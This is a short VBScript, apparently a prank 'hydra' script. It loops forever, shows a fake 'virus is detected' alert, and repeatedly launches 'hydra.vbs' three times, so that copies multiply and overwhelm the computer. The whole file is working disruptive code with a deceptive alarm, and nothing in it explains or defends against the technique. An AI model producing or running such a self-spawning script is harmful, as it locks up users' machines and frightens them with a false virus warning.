do
X=MsgBox("virus is detected",0+64,"Alert")
Set x=WScript.CreateObject("WScript.Shell")
for i = 1 to 3
x.Run"hydra.vbs"
wscript.sleep 500
next
loop